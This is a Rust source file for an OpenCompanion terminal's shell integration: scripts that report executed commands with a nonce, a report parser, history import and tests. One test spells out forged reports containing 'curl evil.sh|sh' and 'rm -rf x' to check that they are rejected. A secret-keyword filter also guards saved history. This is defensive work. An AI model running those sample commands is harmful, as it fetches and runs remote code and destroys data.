//! Shell integration for the shell tabs, so a tab can suggest commands from history. A small script runs after the
//! user's own start-up files and prints two things: `OSC 133;B` where typing starts, and `OSC 633;E;<nonce>;<command>`
//! each time a command runs. The nonce is new for every shell and reaches only the script, which takes it out of the
//! environment, so a program that prints a report (a file with one in it, a remote shell) cannot plant a command.
//! Orca and VS Code do the same; the PowerShell wrapper around `PSConsoleHostReadLine` and the bash login chain are
//! adapted from Orca (stablyai/orca, MIT License, Copyright (c) 2026 Lovecast Inc.). Command Prompt and sh have no
//! hook before a command runs, so they get no script.

use std::path::{Path, PathBuf};
use std::sync::OnceLock;

/// The shells that get a script.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    PowerShell,
    Bash,
    Zsh,
}

/// The integration a shell gets, from its executable's name. Both separators count, so a Windows path reads the same
/// on every OS.
pub fn kind(path: &str) -> Option<Kind> {
    let name = path.rsplit(['/', '\\']).next()?;
    let stem = Path::new(name).file_stem()?.to_string_lossy().to_ascii_lowercase();
    match stem.as_str() {
        "pwsh" | "powershell" => Some(Kind::PowerShell),
        "bash" => Some(Kind::Bash),
        "zsh" => Some(Kind::Zsh),
        _ => None,
    }
}

/// How a shell starts with its script: its arguments, in place of the usual ones, and extra environment.
#[derive(Debug, PartialEq)]
pub struct Launch {
    pub args: Vec<String>,
    pub env: Vec<(String, String)>,
}

/// Writes the script for `kind` under `dir` when it has changed and says how to start the shell with it, handing the
/// script `nonce` for its reports.
pub fn launch(kind: Kind, dir: &Path, nonce: &str) -> std::io::Result<Launch> {
    let mut env = vec![("OPENCOMPANION_NONCE".to_string(), nonce.to_string())];
    let args = match kind {
        Kind::PowerShell => ["-NoLogo", "-NoExit", "-EncodedCommand"].map(String::from).into_iter().chain([encoded_command(POWERSHELL)]).collect(),
        Kind::Bash => {
            let rc = dir.join("bash").join("rc");
            write_if_changed(&rc, BASH)?;
            // Git Bash reads a Windows path with forward slashes as it is.
            vec!["--rcfile".into(), rc.display().to_string().replace('\\', "/"), "-i".into()]
        }
        Kind::Zsh => {
            let zdotdir = dir.join("zsh");
            for (name, body) in ZSH {
                write_if_changed(&zdotdir.join(name), body)?;
            }
            env.push(("ZDOTDIR".to_string(), zdotdir.display().to_string()));
            let user = crate::shell_env::vars()
                .iter()
                .find(|(k, _)| k == "ZDOTDIR")
                .map(|(_, v)| v.clone())
                .or_else(|| std::env::var("ZDOTDIR").ok());
            if let Some(user) = user {
                env.push(("OPENCOMPANION_USER_ZDOTDIR".into(), user));
            }
            vec!["-l".into()]
        }
    };
    Ok(Launch { args, env })
}

fn write_if_changed(path: &Path, body: &str) -> std::io::Result<()> {
    if std::fs::read(path).is_ok_and(|now| now == body.as_bytes()) {
        return Ok(());
    }
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(path, body)
}

/// PowerShell's `-EncodedCommand`: the script as UTF-16LE in base64, which no quoting on the command line can bend.
fn encoded_command(script: &str) -> String {
    let bytes: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
    base64(&bytes)
}

fn base64(bytes: &[u8]) -> String {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let n = chunk.iter().enumerate().fold(0u32, |n, (i, b)| n | (*b as u32) << (16 - 8 * i));
        for i in 0..4 {
            out.push(if i <= chunk.len() { TABLE[(n >> (18 - 6 * i)) as usize & 63] as char } else { '=' });
        }
    }
    out
}

/// Runs after the profiles, which PowerShell loads before `-EncodedCommand`. It wraps `PSConsoleHostReadLine`, which
/// PSReadLine calls right after the prompt is written: the mark goes out first, and the line it returns is reported
/// with every byte outside printable ASCII as `\xHH`, so the console's code page cannot change it. `$?` is set back
/// before PSReadLine reads it. PSReadLine 2.1+ has its own suggestions, turned off here so only one shows.
const POWERSHELL: &str = r#"$__ocNonce = $env:OPENCOMPANION_NONCE
Remove-Item Env:\OPENCOMPANION_NONCE -ErrorAction SilentlyContinue
if ($__ocNonce -and $ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage' -and -not (Test-Path variable:global:__oc)) {
  try {
    if (-not (Get-Module PSReadLine)) { Import-Module PSReadLine -ErrorAction Stop }
    if ((Get-Module PSReadLine).Version -ge [version]'2.1') { Set-PSReadLineOption -PredictionSource None }
    $global:__oc = @{ ReadLine = $function:PSConsoleHostReadLine; Nonce = $__ocNonce }
    if ($global:__oc.ReadLine) {
      function global:PSConsoleHostReadLine {
        $ok = $?
        [Console]::Write("$([char]27)]133;B$([char]7)")
        if (-not $ok) { Write-Error '' -ErrorAction Ignore }
        $line = & $global:__oc.ReadLine
        try {
          $text = New-Object System.Text.StringBuilder
          foreach ($b in [System.Text.Encoding]::UTF8.GetBytes([string]$line)) {
            if ($b -eq 92) { [void]$text.Append('\\') }
            elseif ($b -lt 32 -or $b -gt 126) { [void]$text.Append('\x' + $b.ToString('x2')) }
            else { [void]$text.Append([char]$b) }
          }
          [Console]::Write("$([char]27)]633;E;$($global:__oc.Nonce);$text$([char]7)")
        } catch {}
        $line
      }
    }
  } catch {}
}
Remove-Variable __ocNonce -ErrorAction SilentlyContinue
"#;

/// Loaded with `--rcfile`, which makes the shell a non-login one, so the login files run here as `bash -l` runs
/// them. The command comes from `history 1` once its entry number moves, which keeps `HISTCONTROL` and `HISTIGNORE`;
/// `HISTCMD` would do, but bash 3.2, macOS's own, leaves it at 1 while `PROMPT_COMMAND` runs. The
/// mark goes at the end of `PS1` from the last `PROMPT_COMMAND` entry, after anything that rebuilds the prompt, and
/// before bash-preexec's `__bp_interactive_mode`, which must stay last.
const BASH: &str = r#"# OpenCompanion shell integration for bash.
__oc_nonce=$OPENCOMPANION_NONCE
unset OPENCOMPANION_NONCE
[ -f /etc/profile ] && . /etc/profile
if [ -f "$HOME/.bash_profile" ]; then . "$HOME/.bash_profile"
elif [ -f "$HOME/.bash_login" ]; then . "$HOME/.bash_login"
elif [ -f "$HOME/.profile" ]; then . "$HOME/.profile"
fi

__oc_first=1
__oc_hist=
__oc_precmd() {
  local s=$? c n= bs='\' re='^ *([0-9]+)[* ] '
  c=$(HISTTIMEFORMAT= builtin history 1)
  if [[ $c =~ $re ]]; then
    n=${BASH_REMATCH[1]}
    c=${c:${#BASH_REMATCH[0]}}
  fi
  if [ -n "$__oc_first" ]; then
    __oc_first=
  elif [ -n "$n" ] && [ "$n" != "$__oc_hist" ]; then
    c=${c//"$bs"/"$bs$bs"}
    c=${c//$'\n'/"${bs}x0a"}
    c=${c//$'\r'/"${bs}x0d"}
    c=${c//$'\t'/"${bs}x09"}
    c=${c//$'\a'/"${bs}x07"}
    c=${c//$'\e'/"${bs}x1b"}
    builtin printf '\033]633;E;%s;%s\007' "$__oc_nonce" "$c"
  fi
  __oc_hist=$n
  return $s
}
__oc_mark='\[\033]133;B\007\]'
__oc_ps1() {
  case "$PS1" in
    *"$__oc_mark") ;;
    *) PS1="$PS1$__oc_mark" ;;
  esac
}
if [[ "$(declare -p PROMPT_COMMAND 2>/dev/null)" == "declare -a"* ]]; then
  __oc_pc=(__oc_precmd)
  __oc_added=
  for __oc_e in "${PROMPT_COMMAND[@]}"; do
    if [ "$__oc_e" = __bp_interactive_mode ]; then __oc_pc+=(__oc_ps1); __oc_added=1; fi
    __oc_pc+=("$__oc_e")
  done
  [ -n "$__oc_added" ] || __oc_pc+=(__oc_ps1)
  PROMPT_COMMAND=("${__oc_pc[@]}")
  unset __oc_pc __oc_added __oc_e
else
  __oc_nl=$'\n'
  case "$PROMPT_COMMAND" in
    *__bp_interactive_mode*) PROMPT_COMMAND="__oc_precmd${__oc_nl}${PROMPT_COMMAND/__bp_interactive_mode/__oc_ps1${__oc_nl}__bp_interactive_mode}" ;;
    *) PROMPT_COMMAND="__oc_precmd${__oc_nl}${PROMPT_COMMAND:+$PROMPT_COMMAND$__oc_nl}__oc_ps1" ;;
  esac
  unset __oc_nl
fi
"#;

/// `ZDOTDIR` points at this folder, so zsh reads these files, and each sources the user's own at the top level (a
/// function would make their `typeset` local) with their `ZDOTDIR` in place, or unset when they had none. After
/// `.zshrc` it stays theirs: zsh reads their `.zlogin`, and shells started inside behave as usual. The mark comes
/// from `zle-line-init`, when the prompt is on screen, so prompt themes that rebuild `PROMPT` cannot drop it.
const ZSH: [(&str, &str); 3] = [
    (
        ".zshenv",
        r#"# OpenCompanion shell integration for zsh.
__oc_nonce=${OPENCOMPANION_NONCE-}
unset OPENCOMPANION_NONCE
__oc_dir=$ZDOTDIR
if [[ -n ${OPENCOMPANION_USER_ZDOTDIR-} ]]; then export ZDOTDIR=$OPENCOMPANION_USER_ZDOTDIR; else unset ZDOTDIR; fi
unset OPENCOMPANION_USER_ZDOTDIR
[[ -f ${ZDOTDIR:-$HOME}/.zshenv ]] && source ${ZDOTDIR:-$HOME}/.zshenv
__oc_user=${ZDOTDIR-}
__oc_user_set=${ZDOTDIR+1}
export ZDOTDIR=$__oc_dir
"#,
    ),
    (
        ".zprofile",
        r#"if [[ -n $__oc_user_set ]]; then export ZDOTDIR=$__oc_user; else unset ZDOTDIR; fi
[[ -f ${ZDOTDIR:-$HOME}/.zprofile ]] && source ${ZDOTDIR:-$HOME}/.zprofile
__oc_user=${ZDOTDIR-}
__oc_user_set=${ZDOTDIR+1}
export ZDOTDIR=$__oc_dir
"#,
    ),
    (
        ".zshrc",
        r#"if [[ -n $__oc_user_set ]]; then export ZDOTDIR=$__oc_user; else unset ZDOTDIR; fi
[[ -f ${ZDOTDIR:-$HOME}/.zshrc ]] && source ${ZDOTDIR:-$HOME}/.zshrc
unset __oc_dir __oc_user __oc_user_set
if [[ -o interactive ]]; then
  __oc_preexec() {
    emulate -L zsh
    local c=${1:-$3} bs='\'
    c=${c//"$bs"/"$bs$bs"}
    c=${c//$'\n'/"${bs}x0a"}
    c=${c//$'\r'/"${bs}x0d"}
    c=${c//$'\t'/"${bs}x09"}
    c=${c//$'\a'/"${bs}x07"}
    c=${c//$'\e'/"${bs}x1b"}
    print -rn -- $'\e]633;E;'"$__oc_nonce;$c"$'\a'
  }
  __oc_line_init() { print -rn -- $'\e]133;B\a'; }
  autoload -Uz add-zsh-hook add-zle-hook-widget
  add-zsh-hook preexec __oc_preexec
  add-zle-hook-widget line-init __oc_line_init
fi
"#,
    ),
];

const REPORT: &str = "\x1b]633;E;";
/// A report longer than this without its end is dropped instead of kept for the next chunk.
const LONGEST_REPORT: usize = 64 * 1024;

/// Finds the commands a shell reports in its output, including a report split across chunks. Only reports that carry
/// the shell's nonce count; any other is text a program printed.
pub struct Reports {
    nonce: String,
    carry: String,
}

impl Reports {
    pub fn new(nonce: &str) -> Self {
        Self { nonce: nonce.to_string(), carry: String::new() }
    }

    pub fn feed(&mut self, text: &str) -> Vec<String> {
        let mut buf = std::mem::take(&mut self.carry);
        buf.push_str(text);
        let mut found = Vec::new();
        let mut from = 0;
        while let Some(at) = buf[from..].find(REPORT).map(|i| from + i) {
            let body = at + REPORT.len();
            // BEL ends it, or ST (ESC \), which the payload never holds since it escapes both.
            match buf[body..].find(['\x07', '\x1b']) {
                Some(end) => {
                    let signed = buf[body..body + end].split_once(';').filter(|(nonce, _)| !nonce.is_empty() && *nonce == self.nonce);
                    if let Some((_, command)) = signed {
                        found.push(unescape(command));
                    }
                    from = body + end + 1;
                }
                None => {
                    if buf.len() - at <= LONGEST_REPORT {
                        self.carry = buf[at..].to_string();
                    }
                    return found;
                }
            }
        }
        // The chunk may end partway through the start of a report.
        let rest = &buf[from..];
        let keep = (1..REPORT.len().min(rest.len() + 1))
            .rev()
            .find(|&k| rest.is_char_boundary(rest.len() - k) && REPORT.starts_with(&rest[rest.len() - k..]));
        if let Some(k) = keep {
            self.carry = rest[rest.len() - k..].to_string();
        }
        found
    }
}

/// Reverses the escaping in a report: `\\` is a backslash and `\xHH` one byte, which together make UTF-8.
pub fn unescape(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'\\' {
            if b.get(i + 1) == Some(&b'\\') {
                out.push(b'\\');
                i += 2;
                continue;
            }
            if b.get(i + 1) == Some(&b'x') {
                if let Some(byte) = s.get(i + 2..i + 4).and_then(|h| u8::from_str_radix(h, 16).ok()) {
                    out.push(byte);
                    i += 4;
                    continue;
                }
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Commands longer than this are not saved.
pub const LONGEST_COMMAND: usize = 1000;

/// PSReadLine's own list of words that keep a command out of its history (2.2 and later).
const SENSITIVE: [&str; 5] = ["password", "asplaintext", "token", "apikey", "secret"];

/// The command as it is saved, or `None` when it is not: empty, starting with a space (as bash and zsh leave those
/// out), over one line or `LONGEST_COMMAND` characters, or holding one of PSReadLine's sensitive words.
pub fn keep(command: &str) -> Option<String> {
    if command.starts_with(char::is_whitespace) || command.contains(['\n', '\r']) {
        return None;
    }
    let command = command.trim_end();
    if command.is_empty() || command.chars().count() > LONGEST_COMMAND {
        return None;
    }
    let lower = command.to_lowercase();
    if SENSITIVE.iter().any(|w| lower.contains(w)) {
        return None;
    }
    Some(command.to_string())
}

/// Lines read from the end of each history file.
const HISTORY_LINES: usize = 5000;

/// The shells' own history, newest first, without repeats and filtered like saved commands: PSReadLine's, then
/// bash's, then zsh's. Read once per run, and never written.
pub fn imported() -> &'static [String] {
    static IMPORTED: OnceLock<Vec<String>> = OnceLock::new();
    IMPORTED.get_or_init(|| {
        let home = crate::projects::home();
        let read = |path: Option<PathBuf>| path.and_then(|p| std::fs::read(p).ok()).unwrap_or_default();
        let files = [
            psreadline_entries(&String::from_utf8_lossy(&read(psreadline_history()))),
            bash_entries(&String::from_utf8_lossy(&read(home.as_ref().map(|h| h.join(".bash_history"))))),
            zsh_entries(&read(zsh_history(home.as_deref()))),
        ];
        newest_first(files)
    })
}

fn newest_first(files: [Vec<String>; 3]) -> Vec<String> {
    let mut seen = std::collections::HashSet::new();
    files
        .into_iter()
        .flat_map(|entries| entries.into_iter().rev())
        .filter_map(|c| keep(&c))
        .filter(|c| seen.insert(c.clone()))
        .collect()
}

fn psreadline_history() -> Option<PathBuf> {
    let base = if cfg!(windows) {
        PathBuf::from(std::env::var_os("APPDATA")?).join(r"Microsoft\Windows\PowerShell")
    } else {
        std::env::var_os("XDG_DATA_HOME")
            .map(PathBuf::from)
            .or_else(|| crate::projects::home().map(|h| h.join(".local").join("share")))?
            .join("powershell")
    };
    Some(base.join("PSReadLine").join("ConsoleHost_history.txt"))
}

fn zsh_history(home: Option<&Path>) -> Option<PathBuf> {
    let dir = std::env::var_os("ZDOTDIR").map(PathBuf::from).or_else(|| home.map(Path::to_path_buf))?;
    Some(dir.join(".zsh_history"))
}

fn last_lines(text: &str) -> Vec<&str> {
    let lines: Vec<&str> = text.lines().collect();
    lines[lines.len().saturating_sub(HISTORY_LINES)..].to_vec()
}

/// Oldest first. A command over several lines ends each but the last with a backtick; those are dropped.
fn psreadline_entries(text: &str) -> Vec<String> {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let mut out = Vec::new();
    let mut continued = false;
    for line in last_lines(text) {
        let more = line.ends_with('`');
        if !continued && !more {
            out.push(line.to_string());
        }
        continued = more;
    }
    out
}

/// Oldest first, without the `#1690000000` timestamp lines `HISTTIMEFORMAT` adds.
fn bash_entries(text: &str) -> Vec<String> {
    last_lines(text)
        .into_iter()
        .filter(|l| !(l.len() > 1 && l.starts_with('#') && l[1..].bytes().all(|b| b.is_ascii_digit())))
        .map(String::from)
        .collect()
}

/// Oldest first. zsh stores some bytes "metafied" (0x83, then the byte xor 32), prefixes extended entries with
/// `: <time>:<duration>;`, and ends each line but the last of a longer command with a backslash; those are dropped.
fn zsh_entries(raw: &[u8]) -> Vec<String> {
    let mut bytes = Vec::with_capacity(raw.len());
    let mut it = raw.iter();
    while let Some(&b) = it.next() {
        match b {
            0x83 => bytes.extend(it.next().map(|n| n ^ 32)),
            _ => bytes.push(b),
        }
    }
    let text = String::from_utf8_lossy(&bytes);
    let mut out = Vec::new();
    let mut continued = false;
    for line in last_lines(&text) {
        let trailing = line.len() - line.trim_end_matches('\\').len();
        let more = trailing % 2 == 1;
        if !continued && !more {
            out.push(extended_command(line).to_string());
        }
        continued = more;
    }
    out
}

fn extended_command(line: &str) -> &str {
    let Some(rest) = line.strip_prefix(": ") else { return line };
    let Some((stamp, command)) = rest.split_once(';') else { return line };
    let mut parts = stamp.splitn(2, ':');
    let numeric = |p: Option<&str>| p.is_some_and(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()));
    if numeric(parts.next()) && numeric(parts.next()) {
        command
    } else {
        line
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base64_pads_like_the_standard() {
        assert_eq!(base64(b"Man"), "TWFu");
        assert_eq!(base64(b"Ma"), "TWE=");
        assert_eq!(base64(b"M"), "TQ==");
        assert_eq!(base64(b""), "");
        assert_eq!(encoded_command("ls"), "bABzAA==");
    }

    #[test]
    fn shells_are_known_by_their_executable() {
        assert_eq!(kind(r"C:\Program Files\PowerShell\7\pwsh.exe"), Some(Kind::PowerShell));
        assert_eq!(kind(r"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"), Some(Kind::PowerShell));
        assert_eq!(kind(r"C:\Program Files\Git\bin\bash.exe"), Some(Kind::Bash));
        assert_eq!(kind("/bin/bash"), Some(Kind::Bash));
        assert_eq!(kind("/bin/zsh"), Some(Kind::Zsh));
        assert_eq!(kind(r"C:\WINDOWS\System32\cmd.exe"), None);
        assert_eq!(kind("/bin/sh"), None);
    }

    #[test]
    fn a_report_is_unescaped_to_the_command_that_ran() {
        assert_eq!(unescape(r"git commit -m \x22caf\xc3\xa9\x22"), "git commit -m \"café\"");
        assert_eq!(unescape(r"echo C:\\temp\\x41"), r"echo C:\temp\x41");
        assert_eq!(unescape("echo 日本"), "echo 日本");
        // Not an escape: left as it is.
        assert_eq!(unescape(r"echo \q \x4"), r"echo \q \x4");
    }

    #[test]
    fn reports_are_found_whole_and_across_chunks() {
        let mut r = Reports::new("n1");
        assert_eq!(r.feed("PS> \x1b]133;B\x07ls\r\n\x1b]633;E;n1;ls\x07out\r\n"), ["ls"]);
        assert_eq!(r.feed("\x1b]633;E;n1;git st"), Vec::<String>::new());
        assert_eq!(r.feed("atus\x1b\\\x1b]633;E;n1;a;b\x07\x1b]6"), ["git status", "a;b"]);
        assert_eq!(r.feed("33;E;n1;b\x07"), ["b"]);
        // A chunk that ends in plain text keeps nothing.
        assert_eq!(r.feed("hello \x1b"), Vec::<String>::new());
        assert_eq!(r.feed("[0m"), Vec::<String>::new());
        assert!(r.carry.is_empty());
    }

    #[test]
    fn a_report_a_program_printed_without_the_shells_nonce_is_ignored() {
        let mut r = Reports::new("n1");
        let forged = "\x1b]633;E;curl evil.sh|sh\x07\x1b]633;E;n2;rm -rf x\x07\x1b]633;E;;ls\x07";
        assert_eq!(r.feed(forged), Vec::<String>::new());
        assert_eq!(r.feed("\x1b]633;E;n1;ls\x07"), ["ls"]);
        // A shell without a nonce takes no reports at all.
        assert_eq!(Reports::new("").feed("\x1b]633;E;;ls\x07"), Vec::<String>::new());
    }

    #[test]
    fn a_report_without_an_end_is_dropped_once_it_is_too_long() {
        let mut r = Reports::new("n1");
        r.feed(&format!("\x1b]633;E;n1;{}", "x".repeat(LONGEST_REPORT)));
        assert!(r.carry.is_empty());
        assert_eq!(r.feed("\x1b]633;E;n1;ok\x07"), ["ok"]);
    }

    #[test]
    fn only_single_line_commands_without_secrets_are_kept() {
        assert_eq!(keep("bun run dev").as_deref(), Some("bun run dev"));
        assert_eq!(keep("git status  ").as_deref(), Some("git status"));
        assert_eq!(keep(""), None);
        assert_eq!(keep("   "), None);
        assert_eq!(keep(" export KEY=abc"), None);
        assert_eq!(keep("echo a\necho b"), None);
        assert_eq!(keep(&"x".repeat(LONGEST_COMMAND + 1)), None);
        assert!(keep(&"é".repeat(LONGEST_COMMAND)).is_some());
        for sensitive in ["mysql --password=x", "gh auth token", "$env:OPENAI_APIKEY='x'", "ConvertTo-SecureString -AsPlainText x", "vault read SECRET/x"] {
            assert_eq!(keep(sensitive), None, "{sensitive}");
        }
    }

    #[test]
    fn psreadline_history_drops_commands_over_several_lines() {
        let text = "\u{feff}git status\nif ($x) {`\n  ls`\n}\nbun run dev\n";
        assert_eq!(psreadline_entries(text), ["git status", "bun run dev"]);
    }

    #[test]
    fn bash_history_drops_timestamp_lines() {
        assert_eq!(bash_entries("#1690000000\nls -la\n#1690000001\ncd src\n#notatime\n"), ["ls -la", "cd src", "#notatime"]);
    }

    #[test]
    fn zsh_history_reads_extended_metafied_and_continued_entries() {
        let mut raw = b": 1690000000:0;git status\n: 1690000001:3;echo a\\\nb\nplain\n: 1690000002:0;echo ".to_vec();
        // "日" is 0xE6 0x97 0xA5, and 0x97 is one of the bytes zsh stores as 0x83 then the byte xor 32.
        raw.extend([0xE6, 0x83, 0x97 ^ 32, 0xA5]);
        raw.extend(b"\necho back\\\\\n");
        assert_eq!(zsh_entries(&raw), ["git status", "plain", "echo 日", "echo back\\\\"]);
    }

    #[test]
    fn imported_history_is_newest_first_filtered_and_without_repeats() {
        let ps = vec!["git status".to_string(), "npm i".into(), "git status".into()];
        let bash = vec!["ls".to_string(), " hidden".into(), "npm i".into()];
        let zsh = vec!["gh auth token".to_string(), "make".into()];
        assert_eq!(newest_first([ps, bash, zsh]), ["git status", "npm i", "ls", "make"]);
    }

    #[test]
    fn bash_and_zsh_scripts_are_written_once_and_kept_when_unchanged() {
        let dir = std::env::temp_dir().join(format!("oc-shell-integration-{}", crate::db::new_id()));
        let nonce = ("OPENCOMPANION_NONCE".to_string(), "n1".to_string());
        let bash = launch(Kind::Bash, &dir, "n1").unwrap();
        let rc = dir.join("bash").join("rc");
        assert_eq!(bash.args, ["--rcfile".to_string(), rc.display().to_string().replace('\\', "/"), "-i".into()]);
        assert_eq!(bash.env, std::slice::from_ref(&nonce));
        assert_eq!(std::fs::read_to_string(&rc).unwrap(), BASH);
        let zsh = launch(Kind::Zsh, &dir, "n1").unwrap();
        assert_eq!(zsh.args, ["-l"]);
        assert_eq!(zsh.env[..2], [nonce.clone(), ("ZDOTDIR".to_string(), dir.join("zsh").display().to_string())]);
        for (name, body) in ZSH {
            assert_eq!(std::fs::read_to_string(dir.join("zsh").join(name)).unwrap(), body);
        }
        let ps = launch(Kind::PowerShell, &dir, "n1").unwrap();
        assert_eq!(ps.args[..3], ["-NoLogo", "-NoExit", "-EncodedCommand"]);
        assert_eq!(ps.env, [nonce]);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
